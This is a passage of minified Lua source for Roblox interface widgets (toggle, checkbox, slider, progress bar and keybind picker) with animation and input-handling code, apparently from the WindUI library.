Name="Frame",
},{
ab.NewRoundFrame(an,"Squircle",{
Size=UDim2.new(1,0,1,0),
ImageTransparency=0,
AnchorPoint=Vector2.new(0.5,0.5),
Position=UDim2.new(0.5,0,0.5,0),
Name="Bar",
},{
ab.New("Frame",{
Size=UDim2.new(1,0,1,0),
BackgroundColor3=Color3.new(1,1,1),
Name="Highlight",
BackgroundTransparency=1,
},{
ab.NewRoundFrame(9999,"SquircleGlass",{
Size=UDim2.new(1,1,1,1),
ImageColor3=Color3.new(1,1,1),
Name="SquircleGlass",
ImageTransparency=0.5,
AnchorPoint=Vector2.new(0.5,0.5),
Position=UDim2.new(0.5,0,0.5,0),
}),
ab.NewRoundFrame(an,"Squircle",{
Size=UDim2.new(1,0,1,0),
Name="GlassBackground",
ImageTransparency=0,
ThemeTag={
ImageColor3="ElementBackground",
},
ZIndex=-1,
}),
ac("ImageLabel",{
Size=UDim2.new(1,0,1,0),
BackgroundTransparency=1,
Name="Glass",
ImageTransparency=0,
},{
ac("UICorner",{
CornerRadius=UDim.new(1,0),
}),
}),






ab.NewRoundFrame(an,"Squircle",{
Size=UDim2.new(1,0,1,0),
Name="BarOverlay",
ThemeTag={
ImageColor3="ToggleBar",
},
ZIndex=999,
}),
}),
ao,
ac("UIScale",{
Scale=1,
}),
}),
}),
ac("TextButton",{
Size=UDim2.new(1,0,1,0),
BackgroundTransparency=1,
Position=UDim2.new(0.5,0,0.5,0),
AnchorPoint=Vector2.new(0.5,0.5),
Name="Hitbox",
Text="",
}),
})

local ar
local as

local at=ak and 30 or 20
local au=aq.Size.X.Offset

function am.Set(av,aw,ax,ay)
if not ay then
if aw then
ad(aq.Frame,0.35,{
Position=UDim2.new(0,au-at-2,0.5,0),
},Enum.EasingStyle.Back,Enum.EasingDirection.Out):Play()
ab.SetThemeTag(aq.Frame.Bar.Highlight.Glass,{ImageColor3="Toggle"},0.15)

ad(
aq.Frame.Bar.Highlight.Glass,
0.15,
{ImageTransparency=0},
Enum.EasingStyle.Quint,
Enum.EasingDirection.Out
):Play()
else
ad(aq.Frame,0.35,{
Position=UDim2.new(0,2,0.5,0),
},Enum.EasingStyle.Back,Enum.EasingDirection.Out):Play()
ab.SetThemeTag(aq.Frame.Bar.Highlight.Glass,{ImageColor3="Text"},0.15)
ad(
aq.Frame.Bar.Highlight.Glass,
0.15,
{ImageTransparency=0.85},
Enum.EasingStyle.Quint,
Enum.EasingDirection.Out
):Play()
end
else
if aw then
aq.Frame.Position=UDim2.new(0,au-at-2,0.5,0)
else
aq.Frame.Position=UDim2.new(0,2,0.5,0)
end
end

if aw then
ad(aq.Layer,0.1,{
ImageTransparency=0,
}):Play()
ab.SetThemeTag(aq.Frame.Bar.Highlight.Glass,{ImageColor3="Toggle"},0.1)
ad(
aq.Frame.Bar.Highlight.Glass,
0.1,
{ImageTransparency=0},
Enum.EasingStyle.Quint,
Enum.EasingDirection.Out
):Play()

if ao then
ad(ao,0.1,{
ImageTransparency=0,
}):Play()
end

local az,aA,aB=am:GetGlassFrame(1)

aq.Frame.Bar.Highlight.Glass.Image=az
aq.Frame.Bar.Highlight.Glass.ImageRectSize=aA
aq.Frame.Bar.Highlight.Glass.ImageRectOffset=aB
else
ad(aq.Layer,0.1,{
ImageTransparency=1,
}):Play()
ab.SetThemeTag(aq.Frame.Bar.Highlight.Glass,{ImageColor3="Text"},0.1)
ad(
aq.Frame.Bar.Highlight.Glass,
0.1,
{ImageTransparency=0.85},
Enum.EasingStyle.Quint,
Enum.EasingDirection.Out
):Play()

if ao then
ad(ao,0.1,{
ImageTransparency=1,
}):Play()
end

local az,aA,aB=am:GetGlassFrame(0)

aq.Frame.Bar.Highlight.Glass.Image=az
aq.Frame.Bar.Highlight.Glass.ImageRectSize=aA
aq.Frame.Bar.Highlight.Glass.ImageRectOffset=aB
end

ax=ax~=false

task.spawn(function()
if aj and ax then
ab.SafeCallback(aj,aw)
end
end)
end

function am.Animate(av,aw,ax)
if not al.Window.IsToggleDragging then
al.Window.IsToggleDragging=true

local ay=aw.Position.X
local az=aw.Position.Y
local aA=aq.Frame.Position.X.Offset
local aB=false
local b=false

ad(
aq.Frame.Bar.UIScale,
0.28,
{Scale=1.5},
Enum.EasingStyle.Quint,
Enum.EasingDirection.Out
):Play()
ad(
aq.Frame.Bar.Highlight.BarOverlay,
0.28,
{ImageTransparency=0.86},
Enum.EasingStyle.Quint,
Enum.EasingDirection.Out
):Play()

if ar then
ar:Disconnect()
end

ar=ae.InputChanged:Connect(function(d)
if not al.Window.IsToggleDragging then
return
end
if
d.UserInputType~=Enum.UserInputType.MouseMovement
and d.UserInputType~=Enum.UserInputType.Touch
then
return
end
if aB then
return
end

local f=math.abs(d.Position.X-ay)
math.abs(d.Position.Y-az)

if not b and f>8 then
b=true
end

local g=d.Position.X-ay
local h=math.max(2,math.min(aA+g,au-at-2))

local i=math.clamp((h-2)/(au-at-4),0,1)

local l,m,p=am:GetGlassFrame(i)
aq.Frame.Bar.Highlight.Glass.Image=l
aq.Frame.Bar.Highlight.Glass.ImageRectSize=m
aq.Frame.Bar.Highlight.Glass.ImageRectOffset=p

ad(aq.Frame,0.12,{
Position=UDim2.new(0,h,0.5,0),
},Enum.EasingStyle.Quint,Enum.EasingDirection.Out):Play()
end)

if as then
as:Disconnect()
end

as=ae.InputEnded:Connect(function(d)
if not al.Window.IsToggleDragging then
return
end
if
d.UserInputType~=Enum.UserInputType.MouseButton1
and d.UserInputType~=Enum.UserInputType.Touch
then
return
end

al.Window.IsToggleDragging=false

if ar then
ar:Disconnect()
ar=nil
end
if as then
as:Disconnect()
as=nil
end

al.WindUI.CurrentInput=nil

if aB then
return
end

if not b then
ax:Set(not ax.Value,true,false)
else
local f=aq.Frame.Position.X.Offset
local g=f+at/2
local h=g>au/2
ax:Set(h,true,false)
end

ad(
aq.Frame.Bar.UIScale,
0.23,
{Scale=1},
Enum.EasingStyle.Quint,
Enum.EasingDirection.Out
):Play()
ad(
aq.Frame.Bar.Highlight.BarOverlay,
0.23,
{ImageTransparency=0},
Enum.EasingStyle.Quint,
Enum.EasingDirection.Out
):Play()
end)
end
end

return ap,am
end

return aa end function a.G()

local aa={}

local ab=a.load'd'local ac=
ab.New
local ad=ab.Tween


function aa.New(ae,af,ag,ah,ai,aj)
local ak={}

af=af or"sfsymbols:checkmark"

local al=9

local am=ab.Image(
af,
af,
0,
(aj and aj.Window.Folder or"Temp"),
"Checkbox",
true,
false,
"CheckboxIcon"
)
am.Size=UDim2.new(1,-26+ag,1,-26+ag)
am.AnchorPoint=Vector2.new(0.5,0.5)
am.Position=UDim2.new(0.5,0,0.5,0)


local an=ab.NewRoundFrame(al,"Squircle",{
ImageTransparency=.85,
ThemeTag={
ImageColor3="Text"
},
Parent=ah,
Size=UDim2.new(0,26,0,26),
},{
ab.NewRoundFrame(al,"Squircle",{
Size=UDim2.new(1,0,1,0),
Name="Layer",
ThemeTag={
ImageColor3="Checkbox",
},
ImageTransparency=1,
}),
ab.NewRoundFrame(al,"Glass-1.4",{
Size=UDim2.new(1,0,1,0),
Name="Stroke",
ThemeTag={
ImageColor3="CheckboxBorder",
ImageTransparency="CheckboxBorderTransparency",
},
},{







}),

am,
},true)

function ak.Set(ao,ap)
if ap then
ad(an.Layer,0.06,{
ImageTransparency=0,
}):Play()



ad(am.ImageLabel,0.06,{
ImageTransparency=0,
}):Play()
else
ad(an.Layer,0.05,{
ImageTransparency=1,
}):Play()



ad(am.ImageLabel,0.06,{
ImageTransparency=1,
}):Play()
end

task.spawn(function()
if ai then
ab.SafeCallback(ai,ap)
end
end)
end

return an,ak
end


return aa end function a.H()
local aa=a.load'd'local ab=
aa.New local ac=
aa.Tween

local ad=a.load'F'.New
local ae=a.load'G'.New

local af={}

function af.New(ag,ah)
local ai={
__type="Toggle",
Title=ah.Title or"Toggle",
Desc=ah.Desc or nil,
Locked=ah.Locked or false,
LockedTitle=ah.LockedTitle,
Value=ah.Value,
Icon=ah.Icon or nil,
IconSize=ah.IconSize or 23,
Type=ah.Type or"Toggle",
Callback=ah.Callback or function()end,
UIElements={},
}
ai.ToggleFrame=a.load'C'{
Title=ai.Title,
Desc=ai.Desc,




Window=ah.Window,
Parent=ah.Parent,
TextOffset=(52),
Hover=false,
Tab=ah.Tab,
Index=ah.Index,
ElementTable=ai,
ParentConfig=ah,
Tags=ah.Tags,
}

local aj=true

if ai.Value==nil then
ai.Value=false
end

function ai.Lock(ak)
ai.Locked=true
aj=false
return ai.ToggleFrame:Lock(ai.LockedTitle)
end
function ai.Unlock(ak)
ai.Locked=false
aj=true
return ai.ToggleFrame:Unlock()
end

if ai.Locked then
ai:Lock()
end

local ak=ai.Value

local al,am
if ai.Type=="Toggle"then
al,am=ad(
ak,
ai.Icon,
ai.IconSize,
ai.ToggleFrame.UIElements.Main,
ai.Callback,
ah.Window.NewElements,
ah
)
elseif ai.Type=="Checkbox"then
al,am=ae(
ak,
ai.Icon,
ai.IconSize,
ai.ToggleFrame.UIElements.Main,
ai.Callback,
ah
)
else
error("Unknown Toggle Type: "..tostring(ai.Type))
end

al.AnchorPoint=Vector2.new(1,ah.Window.NewElements and 0 or 0.5)
al.Position=UDim2.new(1,0,ah.Window.NewElements and 0 or 0.5,0)

function ai.Set(an,ao,ap,aq)
if aj then
am:Set(ao,ap,aq or false)
ak=ao
ai.Value=ao
end
end

ai:Set(ak,false,ah.Window.NewElements)

local an=ah.WindUI.GenerateGUID()

if ah.Window.NewElements and am.Animate then
if ai.Type=="Toggle"then
aa.AddSignal(al.ToggleFrame.Hitbox.InputBegan,function(ao)
if
not ah.Window.IsToggleDragging
and(
ao.UserInputType==Enum.UserInputType.MouseButton1
or ao.UserInputType==Enum.UserInputType.Touch
)
then
if ah.WindUI.CurrentInput and ah.WindUI.CurrentInput~=an then
return
end

ah.WindUI.CurrentInput=an
am:Animate(ao,ai)
end
end)
end





else
if ai.Type=="Toggle"then
aa.AddSignal(al.ToggleFrame.Hitbox.MouseButton1Click,function()
ai:Set(not ai.Value,nil,ah.Window.NewElements)
end)
elseif ai.Type=="Checkbox"then
aa.AddSignal(al.MouseButton1Click,function()
ai:Set(not ai.Value,nil,ah.Window.NewElements)
end)
end
end

return ai.__type,ai
end

return af end function a.I()

local aa=(cloneref or clonereference or function(aa)
return aa
end)

local ac=aa(game:GetService"UserInputService")
local ad=aa(game:GetService"RunService")

local ae=a.load'd'
local af=ae.New
local ag=ae.Tween

local ah={}

local ai=false

function ah.New(aj,ak)
local al={
__type="Slider",
Title=ak.Title or nil,
Desc=ak.Desc or nil,
Locked=ak.Locked or nil,
LockedTitle=ak.LockedTitle,
Value=ak.Value or{},
Icons=ak.Icons or nil,
IsTooltip=ak.IsTooltip or false,
IsTextbox=ak.IsTextbox,
Step=ak.Step or 1,
Callback=ak.Callback or function()end,
UIElements={},
IsFocusing=false,

Width=ak.Width or 130,
TextBoxWidth=ak.Window.NewElements and 40 or 30,
ThumbSize=13,
IconSize=26,
}
if al.Icons=={}then
al.Icons={
From="sfsymbols:sunMinFill",
To="sfsymbols:sunMaxFill",
}
end
if al.IsTextbox==nil and al.Title==nil then
al.IsTextbox=false
else
al.IsTextbox=al.IsTextbox~=false
end

local am
local an
local ao
local ap=al.Value.Default or al.Value.Min or 0

local aq=ap
local ar=(ap-(al.Value.Min or 0))/((al.Value.Max or 100)-(al.Value.Min or 0))

local as=true
local at=al.Step%1~=0

local function FormatValue(au)
if at then
return tonumber(string.format("%.2f",au))
end
return math.floor(au+0.5)
end

local function CalculateValue(au)
if at then
return math.floor(au/al.Step+0.5)*al.Step
else
return math.floor(au/al.Step+0.5)*al.Step
end
end

local au,av
local aw=32
if al.Icons then
if al.Icons.From then
au=ae.Image(
al.Icons.From,
al.Icons.From,
0,
ak.Window.Folder,
"SliderIconFrom",
true,
true,
"SliderIconFrom"
)
au.Size=UDim2.new(0,al.IconSize,0,al.IconSize)
aw=aw+al.IconSize-2
end
if al.Icons.To then
av=ae.Image(
al.Icons.To,
al.Icons.To,
0,
ak.Window.Folder,
"SliderIconTo",
true,
true,
"SliderIconTo"
)
av.Size=UDim2.new(0,al.IconSize,0,al.IconSize)
aw=aw+al.IconSize-2
end
end
al.SliderFrame=a.load'C'{
Title=al.Title,
Desc=al.Desc,
Parent=ak.Parent,
TextOffset=al.Width,
Hover=false,
Tab=ak.Tab,
Index=ak.Index,
Window=ak.Window,
ElementTable=al,
ParentConfig=ak,
Tags=ak.Tags,
}

al.UIElements.SliderIcon=ae.NewRoundFrame(99,"Squircle",{
ImageTransparency=0.95,
Size=UDim2.new(1,not al.IsTextbox and-aw or(-al.TextBoxWidth-8),0,4),
AnchorPoint=Vector2.new(0.5,0.5),
Position=UDim2.new(0.5,0,0.5,0),
Name="Frame",
ThemeTag={
ImageColor3="Text",
},
},{
ae.NewRoundFrame(99,"Squircle",{
Name="Frame",
Size=UDim2.new(ar,0,1,0),
ImageTransparency=0.1,
ThemeTag={
ImageColor3="Slider",
},
},{
ae.NewRoundFrame(99,"Squircle",{
Size=UDim2.new(
0,
ak.Window.NewElements and(al.ThumbSize*2)or(al.ThumbSize+2),
0,
ak.Window.NewElements and(al.ThumbSize+4)or(al.ThumbSize+2)
),
Position=UDim2.new(1,0,0.5,0),
AnchorPoint=Vector2.new(0.5,0.5),
ThemeTag={
ImageColor3="SliderThumb",
},
Name="Thumb",
},{
ae.NewRoundFrame(999,"SquircleGlass",{
Size=UDim2.new(1,0,1,0),
ImageColor3=Color3.new(1,1,1),
Name="Highlight",
ImageTransparency=0.5,
}),
}),
}),
})

al.UIElements.SliderContainer=af("Frame",{
Size=UDim2.new(al.Title==nil and 1 or 0,al.Title==nil and 0 or al.Width,0,0),
AutomaticSize="Y",
Position=UDim2.new(1,al.IsTextbox and(ak.Window.NewElements and-16 or 0)or 0,0.5,0),
AnchorPoint=Vector2.new(1,0.5),
BackgroundTransparency=1,
Parent=al.SliderFrame.UIElements.Main,
},{
af("UIListLayout",{
Padding=UDim.new(0,al.Title~=nil and 8 or 12),
FillDirection="Horizontal",
VerticalAlignment="Center",
HorizontalAlignment=al.Icons
and(al.Icons.From and(al.Icons.To and"Center"or"Left")or al.Icons.To and"Right")
or"Center",
}),
au,
al.UIElements.SliderIcon,
av,
af("TextBox",{
Size=UDim2.new(0,al.TextBoxWidth,0,0),
TextXAlignment="Left",
Text=FormatValue(ap),
ThemeTag={
TextColor3="Text",
},
TextTransparency=0.4,
AutomaticSize="Y",
TextSize=15,
FontFace=Font.new(ae.Font,Enum.FontWeight.Medium),
BackgroundTransparency=1,
LayoutOrder=-1,
Visible=al.IsTextbox,
}),
})

local ax
if al.IsTooltip then
ax=a.load'B'.New(
ap,
al.UIElements.SliderIcon.Frame.Thumb,
true,
"Secondary",
"Small",
false
)
ax.Container.AnchorPoint=Vector2.new(0.5,1)
ax.Container.Position=UDim2.new(0.5,0,0,-8)
end

function al.Lock(ay)
al.Locked=true
as=false
return al.SliderFrame:Lock(al.LockedTitle)
end
function al.Unlock(ay)
al.Locked=false
as=true
return al.SliderFrame:Unlock()
end

if al.Locked then
al:Lock()
end


local ay=ak.Tab.UIElements.ContainerFrame

function al.Set(az,aA,aB)
if as then
if
not al.IsFocusing
and not ai
and(
not aB
or(
aB.UserInputType==Enum.UserInputType.MouseButton1
or aB.UserInputType==Enum.UserInputType.Touch
)
)
then
if aB then
am=(aB.UserInputType==Enum.UserInputType.Touch)
ay.ScrollingEnabled=false
ai=true

local b=am and aB.Position.X or ac:GetMouseLocation().X
local d=math.clamp(
(b-al.UIElements.SliderIcon.AbsolutePosition.X)
/al.UIElements.SliderIcon.AbsoluteSize.X,
0,
1
)
aA=CalculateValue(al.Value.Min+d*(al.Value.Max-al.Value.Min))
aA=math.clamp(aA,al.Value.Min or 0,al.Value.Max or 100)

if aA~=aq then
ag(al.UIElements.SliderIcon.Frame,0.05,{Size=UDim2.new(d,0,1,0)}):Play()
al.UIElements.SliderContainer.TextBox.Text=FormatValue(aA)
if ax then
ax.TitleFrame.Text=FormatValue(aA)
end
al.Value.Default=FormatValue(aA)
aq=aA
ae.SafeCallback(al.Callback,FormatValue(aA))
end

an=ad.RenderStepped:Connect(function()
local f=am and aB.Position.X or ac:GetMouseLocation().X
local g=math.clamp(
(f-al.UIElements.SliderIcon.AbsolutePosition.X)
/al.UIElements.SliderIcon.AbsoluteSize.X,
0,
1
)
aA=CalculateValue(al.Value.Min+g*(al.Value.Max-al.Value.Min))

if aA~=aq then
ag(al.UIElements.SliderIcon.Frame,0.05,{Size=UDim2.new(g,0,1,0)}):Play()
al.UIElements.SliderContainer.TextBox.Text=FormatValue(aA)
if ax then
ax.TitleFrame.Text=FormatValue(aA)
end
al.Value.Default=FormatValue(aA)
aq=aA
ae.SafeCallback(al.Callback,FormatValue(aA))
end
end)


ao=ac.InputEnded:Connect(function(f)
if
(
f.UserInputType==Enum.UserInputType.MouseButton1
or f.UserInputType==Enum.UserInputType.Touch
)and aB==f
then
an:Disconnect()
ao:Disconnect()
ai=false
ay.ScrollingEnabled=true

ak.WindUI.CurrentInput=nil

if ak.Window.NewElements then
ag(al.UIElements.SliderIcon.Frame.Thumb,0.2,{
ImageTransparency=0,
Size=UDim2.new(
0,
ak.Window.NewElements and(al.ThumbSize*2)or(al.ThumbSize+2),
0,
ak.Window.NewElements and(al.ThumbSize+4)or(al.ThumbSize+2)
),
},Enum.EasingStyle.Quint,Enum.EasingDirection.InOut):Play()
end
if ax then
ax:Close(false)
end
end
end)
else
aA=math.clamp(aA,al.Value.Min or 0,al.Value.Max or 100)

local b=math.clamp(
(aA-(al.Value.Min or 0))/((al.Value.Max or 100)-(al.Value.Min or 0)),
0,
1
)
aA=CalculateValue(al.Value.Min+b*(al.Value.Max-al.Value.Min))

if aA~=aq then
ag(al.UIElements.SliderIcon.Frame,0.05,{Size=UDim2.new(b,0,1,0)}):Play()
al.UIElements.SliderContainer.TextBox.Text=FormatValue(aA)
if ax then
ax.TitleFrame.Text=FormatValue(aA)
end
al.Value.Default=FormatValue(aA)
aq=aA
ae.SafeCallback(al.Callback,FormatValue(aA))
end
end
end
end
end

function al.SetMax(az,aA)
al.Value.Max=aA

local aB=tonumber(al.Value.Default)or aq
if aB>aA then
al:Set(aA)
else
local b=
math.clamp((aB-(al.Value.Min or 0))/(aA-(al.Value.Min or 0)),0,1)
ag(al.UIElements.SliderIcon.Frame,0.1,{Size=UDim2.new(b,0,1,0)}):Play()
end
end

function al.SetMin(az,aA)
al.Value.Min=aA

local aB=tonumber(al.Value.Default)or aq
if aB<aA then
al:Set(aA)
else
local b=math.clamp((aB-aA)/((al.Value.Max or 100)-aA),0,1)
ag(al.UIElements.SliderIcon.Frame,0.1,{Size=UDim2.new(b,0,1,0)}):Play()
end
end

ae.AddSignal(al.UIElements.SliderContainer.TextBox.FocusLost,function(az)
local aA=tonumber(al.UIElements.SliderContainer.TextBox.Text)
if aA then
al:Set(aA)
else
al.UIElements.SliderContainer.TextBox.Text=FormatValue(aq)
if ax then
ax.TitleFrame.Text=FormatValue(aq)
end
end
end)

local az=ak.WindUI.GenerateGUID()

ae.AddSignal(al.UIElements.SliderContainer.InputBegan,function(aA)
if al.Locked or ai then
return
end
if
aA.UserInputType==Enum.UserInputType.MouseButton1
or aA.UserInputType==Enum.UserInputType.Touch
then
if ak.WindUI.CurrentInput and ak.WindUI.CurrentInput~=az then
return
end
ak.WindUI.CurrentInput=az

al:Set(ap,aA)


if ak.Window.NewElements then
ag(al.UIElements.SliderIcon.Frame.Thumb,0.24,{
ImageTransparency=0.85,
Size=UDim2.new(
0,
(ak.Window.NewElements and(al.ThumbSize*2)or al.ThumbSize)+8,
0,
al.ThumbSize+8
),
},Enum.EasingStyle.Quint,Enum.EasingDirection.Out):Play()
end
if ax then
ax:Open()
end

end
end)

return al.__type,al
end

return ah end function a.J()

local aa=a.load'd'
local ac=aa.New
local ad=aa.Tween

local ae={}

local function ToFiniteNumber(af)
local ag=tonumber(af)
if ag==nil or ag~=ag or math.abs(ag)==math.huge then
return nil
end

return ag
end

local function FormatNumber(af)
if af%1==0 then
return tostring(af)
end

return tostring(tonumber(string.format("%.2f",af)))
end

function ae.New(af,ag)
local ah=typeof(ag.Value)=="table"and ag.Value or{}
local ai=ToFiniteNumber(ah.Min)or ToFiniteNumber(ag.Min)or 0
local aj=ToFiniteNumber(ah.Max)or ToFiniteNumber(ag.Max)or 100

if ai>aj then
ai,aj=aj,ai
end

local ak=typeof(ag.Value)=="number"and ag.Value
or ToFiniteNumber(ah.Default)
or ToFiniteNumber(ag.Default)
or ai
ak=ToFiniteNumber(ak)or ai

local al=ag.Indeterminate==true

local am=ag.ShowValue
if am==nil then
am=not al
end

local an=math.max(ToFiniteNumber(ag.ValueWidth)or 44,0)

local ao={
__type="ProgressBar",
Title=ag.Title or"Progress",
Desc=ag.Desc or nil,
Value={
Min=ai,
Max=aj,
Default=math.clamp(ak,ai,aj),
},
ShowValue=am,
DisplayMode=ag.DisplayMode or"Percent",
Format=ag.Format,
Animate=ag.Animate~=false,
AnimationDuration=math.max(ToFiniteNumber(ag.AnimationDuration)or 0.15,0),
Indeterminate=al,
IndeterminateText=ag.IndeterminateText or"",
Speed=math.max(ToFiniteNumber(ag.Speed)or 1,0.01),
ControlGap=math.max(ToFiniteNumber(ag.ControlGap)or 16,0),
UIElements={},

Width=math.max(ToFiniteNumber(ag.Width)or 160,0),
ValueWidth=an,
}

local function GetRatio(ap)
if ao.Value.Max==ao.Value.Min then
return ap>=ao.Value.Max and 1 or 0
end

return math.clamp((ap-ao.Value.Min)/(ao.Value.Max-ao.Value.Min),0,1)
end

local function GetValueText(ap,aq)
if ao.Indeterminate then
return tostring(ao.IndeterminateText)
end

local ar=aq*100

if typeof(ao.Format)=="function"then
local as,at=
pcall(ao.Format,ap,ar,ao.Value.Min,ao.Value.Max)

if as and at~=nil then
return tostring(at)
end
end

if ao.DisplayMode=="Value"then
return FormatNumber(ap)
elseif ao.DisplayMode=="Fraction"then
return FormatNumber(ap).."/"..FormatNumber(ao.Value.Max)
end

return tostring(math.floor(ar+0.5)).."%"
end

ao.ProgressBarFrame=a.load'C'{
Title=ao.Title,
Desc=ao.Desc,
Parent=ag.Parent,
TextOffset=ao.Width+ao.ControlGap,
Hover=false,
Tab=ag.Tab,
Index=ag.Index,
Window=ag.Window,
ElementTable=ao,
ParentConfig=ag,
Tags=ag.Tags,
}

ao.UIElements.Fill=aa.NewRoundFrame(99,"Squircle",{
Name="Fill",
Size=ao.Indeterminate and UDim2.new(0.3,0,1,0)
or UDim2.new(GetRatio(ao.Value.Default),0,1,0),
Position=ao.Indeterminate and UDim2.new(-0.3,0,0,0)or UDim2.new(0,0,0,0),
ThemeTag={
ImageColor3="ProgressBar",
},
})

ao.UIElements.Bar=aa.NewRoundFrame(99,"Squircle",{
Name="Bar",
Size=UDim2.new(1,ao.ShowValue and-(ao.ValueWidth+8)or 0,0,6),
ClipsDescendants=true,
ImageTransparency=0.9,
ThemeTag={
ImageColor3="ProgressBarTrack",
ImageTransparency="ProgressBarTrackTransparency",
},
},{
ao.UIElements.Fill,
})

ao.UIElements.Value=ac("TextLabel",{
Name="Value",
Size=UDim2.new(0,ao.ValueWidth,0,20),
BackgroundTransparency=1,
FontFace=Font.new(aa.Font,Enum.FontWeight.Medium),
Text=GetValueText(ao.Value.Default,GetRatio(ao.Value.Default)),
TextSize=14,
TextTransparency=0.25,
TextTruncate="AtEnd",
TextXAlignment="Right",
Visible=ao.ShowValue,
ThemeTag={
TextColor3="ProgressBarText",
},
})

ao.UIElements.Container=ac("Frame",{
Name="ProgressBarContainer",
Size=UDim2.new(0,ao.Width,0,36),
Position=UDim2.new(1,0,ag.Window.NewElements and 0 or 0.5,0),
AnchorPoint=Vector2.new(1,ag.Window.NewElements and 0 or 0.5),
BackgroundTransparency=1,
Parent=ao.ProgressBarFrame.UIElements.Main,
},{
ac("UIListLayout",{
Padding=UDim.new(0,8),
FillDirection="Horizontal",
HorizontalAlignment="Right",
VerticalAlignment="Center",
}),
ao.UIElements.Bar,
ao.UIElements.Value,
})

if ao.Indeterminate then
local ap=ad(
ao.UIElements.Fill,
1/ao.Speed,
{Position=UDim2.new(1,0,0,0)},
Enum.EasingStyle.Linear,
Enum.EasingDirection.InOut,-1

)
aa.AddSignal(ao.UIElements.Bar.Destroying,function()
ap:Cancel()
end)
ap:Play()
end

local function Update(ap,aq)
local ar=ToFiniteNumber(ap)
if ar==nil then
return ao.Value.Default
end

ar=math.clamp(ar,ao.Value.Min,ao.Value.Max)
ao.Value.Default=ar

local as=GetRatio(ar)
local at=UDim2.new(as,0,1,0)

if ao.UIElements.Fill and not ao.Indeterminate then
if aq or not ao.Animate or ao.AnimationDuration<=0 then
ao.UIElements.Fill.Size=at
else
ad(
ao.UIElements.Fill,
ao.AnimationDuration,
{Size=at},
Enum.EasingStyle.Quint,
Enum.EasingDirection.Out
):Play()
end
end

ao.UIElements.Value.Text=GetValueText(ar,as)

return ar
end

function ao.Set(ap,aq)
return Update(aq,false)
end

function ao.Get(ap)
return ao.Value.Default
end

function ao.GetPercentage(ap)
return GetRatio(ao.Value.Default)*100
end

function ao.SetRange(ap,aq,ar)
aq=ToFiniteNumber(aq)
ar=ToFiniteNumber(ar)

if aq==nil or ar==nil then
return ao.Value.Min,ao.Value.Max
end

if aq>ar then
aq,ar=ar,aq
end

ao.Value.Min=aq
ao.Value.Max=ar
Update(ao.Value.Default,false)

return aq,ar
end

function ao.SetMin(ap,aq)
aq=ToFiniteNumber(aq)
if aq==nil then
return ao.Value.Min
end

ao:SetRange(aq,math.max(aq,ao.Value.Max))
return ao.Value.Min
end

function ao.SetMax(ap,aq)
aq=ToFiniteNumber(aq)
if aq==nil then
return ao.Value.Max
end

ao:SetRange(math.min(ao.Value.Min,aq),aq)
return ao.Value.Max
end

Update(ao.Value.Default,true)

return ao.__type,ao
end

return ae end function a.K()

local aa=(cloneref or clonereference or function(aa)
return aa
end)

local ac=aa(game:GetService"UserInputService")

local ad=a.load'd'
local ae=ad.New local af=
ad.Tween

local ag={
UICorner=6,
UIPadding=8,
}

local ah=a.load'w'.New

function ag.New(ai,aj)
local function NormalizeKeyCode(ak)
if typeof(ak)=="EnumItem"then
return ak.Name
elseif type(ak)=="string"then
return ak
else
return"F"
end
end

local ak={
__type="Keybind",
Title=aj.Title or"Keybind",
Desc=aj.Desc or nil,
Locked=aj.Locked or false,
LockedTitle=aj.LockedTitle,
Value=NormalizeKeyCode(aj.Value)or"F",
Callback=aj.Callback or function()end,
CanChange=aj.CanChange~=false,
Blacklist=aj.Blacklist or{},
Picking=false,
UIElements={},
}

local al={}

for am,an in next,ak.Blacklist do
table.insert(al,Enum.KeyCode[NormalizeKeyCode(an)])
end
table.insert(al,Enum.KeyCode[NormalizeKeyCode"Escape"])

local am=true

ak.KeybindFrame=a.load'C'{
Title=ak.Title,
Desc=ak.Desc,
Parent=aj.Parent,
TextOffset=85,
Hover=ak.CanChange,
Tab=aj.Tab,
Index=aj.Index,
Window=aj.Window,
ElementTable=ak,
ParentConfig=aj,
Tags=aj.Tags,
}

ak.UIElements.Keybind=ah(
ak.Value,
nil,
ak.KeybindFrame.UIElements.Main,
nil,
aj.Window.NewElements and 12 or 10
)

ak.UIElements.Keybind.Size=
UDim2.new(0,24+ak.UIElements.Keybind.Frame.Frame.TextLabel.TextBounds.X,0,42)
ak.UIElements.Keybind.AnchorPoint=Vector2.new(1,0.5)
ak.UIElements.Keybind.Position=UDim2.new(1,0,0.5,0)
ak.UIElements.Keybind.Interactable=false

ae("UIScale",{
Parent=ak.UIElements.Keybind,
Scale=0.85,
})

ad.AddSignal(
ak.UIElements.Keybind.Frame.Frame.TextLabel:GetPropertyChangedSignal"TextBounds",
function()
ak.UIElements.Keybind.Size=
UDim2.new(0,24+ak.UIElements.Keybind.Frame.Frame.TextLabel.TextBounds.X,0,42)
end
)

function ak.Lock(an)
ak.Locked=true
am=false
return ak.KeybindFrame:Lock(ak.LockedTitle)
end
function ak.Unlock(an)
ak.Locked=false
am=true
return ak.KeybindFrame:Unlock()
end

function ak.Set(an,ao)
local ap=NormalizeKeyCode(ao)
ak.Value=ap
ak.UIElements.Keybind.Frame.Frame.TextLabel.Text=ap
end

if ak.Locked then
ak:Lock()
end

local an

ad.AddSignal(ak.KeybindFrame.UIElements.Main.MouseButton1Click,function()
if am then
if ak.CanChange then
ak.Picking=true
ak.UIElements.Keybind.Frame.Frame.TextLabel.Text="..."



local ao
ao=ac.InputBegan:Connect(function(ap)
local aq

if ap.UserInputType==Enum.UserInputType.Keyboard then
if table.find(al,ap.KeyCode)then
aq=nil
return
else
aq=ap.KeyCode.Name
end
elseif
ap.UserInputType==Enum.UserInputType.MouseButton1
and not table.find(al,"MouseLeftButton")
then
aq="MouseLeftButton"
elseif
ap.UserInputType==Enum.UserInputType.MouseButton2
and not table.find(al,"MouseRightButton")
then
aq="MouseRightButton"
end

if an then
an:Disconnect()
end

an=ac.InputEnded:Connect(function(ar)
if
aq
and(
ar.KeyCode.Name==aq
or aq=="MouseLeft"and ar.UserInputType==Enum.UserInputType.MouseButton1
or aq=="MouseRight"and ar.UserInputType==Enum.UserInputType.MouseButton2
)
then
ak.Picking=false

ak.UIElements.Keybind.Frame.Frame.TextLabel.Text=aq
ak.Value=aq

ao:Disconnect()
an:Disconnect()
end
end)
end)
end
end
end)

ad.AddSignal(ac.InputBegan,function(ao,ap)
if ac:GetFocusedTextBox()then
return
end
if not am then
return
end
if ak.Picking then
return
end

if ao.UserInputType==Enum.UserInputType.Keyboard then
if ao.KeyCode.Name==ak.Value then
ad.SafeCallback(ak.Callback,ao.KeyCode.Name)
end
